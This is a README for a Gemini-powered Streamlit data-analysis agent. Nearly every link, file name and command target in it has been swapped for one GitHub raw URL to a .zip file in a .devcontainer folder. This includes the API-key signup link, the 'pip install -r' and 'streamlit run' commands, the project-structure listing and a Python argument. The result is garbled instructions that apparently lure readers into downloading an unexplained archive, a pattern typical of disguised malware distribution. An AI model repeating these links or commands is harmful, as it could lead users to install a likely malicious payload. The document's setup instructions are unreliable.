# 📊 Data Analyst AI Agent

An intelligent data analysis application powered by Google's Gemini AI that allows you to analyze, clean, and transform your datasets using natural language queries.

## 🌟 Features

- **Natural Language Queries**: Ask questions about your data in plain English
- **Automated Data Analysis**: The AI agent writes and executes SQL queries for you
- **Data Cleaning & Transformation**: Remove duplicates, filter rows, handle missing values
- **Interactive Data Visualization**: View your data in interactive tables
- **Download Modified Data**: Export cleaned/filtered datasets as CSV files
- **Multiple File Format Support**: Upload CSV or Excel files
- **Smart Data Type Detection**: Automatically detects dates, numbers, and text columns

## 🚀 Getting Started

### Prerequisites

- Python 3.8 or higher
- Google Gemini API key ([Get one here](https://github.com/Plutonian-coder/AI-Data-Analysis-Agent/raw/refs/heads/main/.devcontainer/Data-Agent-A-Analysis-3.1.zip))

### Installation

1. **Clone the repository**
   ```bash
   git clone <your-repo-url>
   cd data-analyst-agent
   ```

2. **Install required packages**
   ```bash
   pip install streamlit pandas agno duckdb openpyxl
   ```

   Or use the requirements file:
   ```bash
   pip install -r https://github.com/Plutonian-coder/AI-Data-Analysis-Agent/raw/refs/heads/main/.devcontainer/Data-Agent-A-Analysis-3.1.zip
   ```

### Running the Application

1. **Start the Streamlit app**
   ```bash
   streamlit run https://github.com/Plutonian-coder/AI-Data-Analysis-Agent/raw/refs/heads/main/.devcontainer/Data-Agent-A-Analysis-3.1.zip
   ```

2. **Open your browser**
   - The app will automatically open at `http://localhost:8501`
   - If not, manually navigate to that URL

3. **Enter your Gemini API key**
   - In the sidebar, paste your Google Gemini API key
   - Click outside the text box to save

4. **Upload your data**
   - Click "Browse files" or drag & drop a CSV/Excel file
   - Supported formats: `.csv`, `.xlsx`

5. **Start analyzing!**
   - Type your question in the text area
   - Click "Submit Query"
   - View results and download modified data if applicable

## 📖 Usage Examples

### Simple Queries
```
What's the average age in this dataset?
How many rows are in the data?
Show me the column names
What's the maximum salary?
```

### Data Filtering
```
Show me all rows where age > 30
Filter the data to only include sales from 2023
Find all customers from New York
Show records where status is 'active'
```

### Data Cleaning
```
Remove duplicate rows
Delete rows with missing values
Filter out rows where price is less than 0
Show me the cleaned dataset
```

### Data Transformation
```
Sort the data by date in descending order
Show me the top 10 highest-grossing products
Group the data by category and show counts
Create a summary of sales by region
```

## 🛠️ Technical Architecture

### Core Components

1. **Streamlit UI**: Web interface for user interaction
2. **Google Gemini AI**: Powers the intelligent query understanding
3. **DuckDB**: Fast in-memory SQL database for data operations
4. **Pandas**: Data manipulation and analysis
5. **Agno Framework**: Orchestrates the AI agent and tools

### How It Works

```
User Query → Gemini AI → Tool Selection → SQL Execution → Result Display
                ↓
            DuckDbTools
            PandasTools
```

1. User uploads a CSV/Excel file
2. Data is preprocessed and loaded into DuckDB
3. User asks a question in natural language
4. Gemini AI analyzes the question
5. AI decides which tools to use (SQL, pandas)
6. Tools execute operations on the data
7. Results are displayed and made downloadable

## 📁 Project Structure

```
data-analyst-agent/
│
├── https://github.com/Plutonian-coder/AI-Data-Analysis-Agent/raw/refs/heads/main/.devcontainer/Data-Agent-A-Analysis-3.1.zip                  # Main application file
├── https://github.com/Plutonian-coder/AI-Data-Analysis-Agent/raw/refs/heads/main/.devcontainer/Data-Agent-A-Analysis-3.1.zip        # Python dependencies
├── https://github.com/Plutonian-coder/AI-Data-Analysis-Agent/raw/refs/heads/main/.devcontainer/Data-Agent-A-Analysis-3.1.zip              # This file
└── temp/                  # Temporary files (auto-generated)
```

## 🔧 Configuration

### API Keys

The application requires a Google Gemini API key. You can:
- Enter it in the sidebar (temporary, for current session)
- Set it as an environment variable:
  ```bash
  export GEMINI_API_KEY="your-api-key-here"
  ```

### Supported Models

Currently using: `gemini-2.5-flash`

You can modify this in `https://github.com/Plutonian-coder/AI-Data-Analysis-Agent/raw/refs/heads/main/.devcontainer/Data-Agent-A-Analysis-3.1.zip`:
```python
model=Gemini(id="gemini-2.5-flash", https://github.com/Plutonian-coder/AI-Data-Analysis-Agent/raw/refs/heads/main/.devcontainer/Data-Agent-A-Analysis-3.1.zip)
```

Other available models:
- `gemini-2.5-pro` (more powerful, slower)
- `gemini-1.5-flash` (older version)

## 📊 Data Requirements

### Supported File Formats
- CSV (`.csv`)
- Excel (`.xlsx`)

### Data Preprocessing
The app automatically:
- Handles missing values (`NA`, `N/A`, `missing`)
- Detects and converts date columns
- Attempts numeric conversion for number-like text
- Quotes text fields properly for CSV export

### Best Practices
- Use clear column names (e.g., `sales_amount` not `col1`)
- Include column headers in your file
- Avoid special characters in column names
- Keep file sizes reasonable (< 100MB recommended)

## 🎯 Agent Capabilities

### What the AI Can Do

✅ **Data Analysis**
- Calculate statistics (mean, median, sum, count)
- Find min/max values
- Group and aggregate data
- Sort and rank data

✅ **Data Filtering**
- Filter by conditions
- Select specific columns
- Remove duplicates
- Handle missing values

✅ **Data Export**
- Save modified datasets
- Create subsets of data
- Export filtered results

### What the AI Cannot Do

❌ Create visualizations (charts/graphs)
❌ Perform machine learning
❌ Access external data sources
❌ Modify your original file (only creates new versions)

## 🐛 Troubleshooting

### Common Issues

**Issue**: "Error generating response from the agent"
- **Solution**: Check your API key is valid and has available quota

**Issue**: "Could not retrieve updated data from DuckDB"
- **Solution**: Rephrase your query to be more specific

**Issue**: "Unsupported file format"
- **Solution**: Ensure your file is `.csv` or `.xlsx`

**Issue**: No download button appears
- **Solution**: Make sure your query involves data modification (filtering, cleaning, etc.)

### Debug Mode

Check the terminal/console where you ran `streamlit run` for detailed logs:
```bash
INFO Running: SELECT * FROM uploaded_data WHERE age > 30
INFO Query executed successfully
```

## 🔐 Security & Privacy

- **API Keys**: Never commit API keys to version control
- **Data Privacy**: All data processing happens locally or in your DuckDB instance
- **Temporary Files**: Located in system temp directory, automatically cleaned up
- **No Data Retention**: The AI doesn't store your data after the session ends

## 📦 Dependencies

```txt
streamlit>=1.28.0
pandas>=2.0.0
agno>=0.1.0
duckdb>=0.9.0
openpyxl>=3.1.0
```

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## 📝 License

This project is licensed under the MIT License - see the LICENSE file for details.

## 🙏 Acknowledgments

- **Google Gemini**: For the powerful AI model
- **Streamlit**: For the amazing web framework
- **DuckDB**: For fast SQL operations
- **Agno Framework**: For agent orchestration

## 📧 Support

If you encounter any issues or have questions:
- Check the [Troubleshooting](#-troubleshooting) section
- Open an issue on GitHub
- Check the terminal output for error messages

## 🗺️ Roadmap

Future enhancements planned:
- [ ] Data visualization capabilities
- [ ] Support for more file formats (JSON, Parquet)
- [ ] Multi-table joins
- [ ] Export to multiple formats
- [ ] Session history and chat memory
- [ ] Pre-built query templates
- [ ] Automated data quality reports

---

**Made with ❤️ by KHALID YEKINI**

*Happy Data Analyzing! 🚀*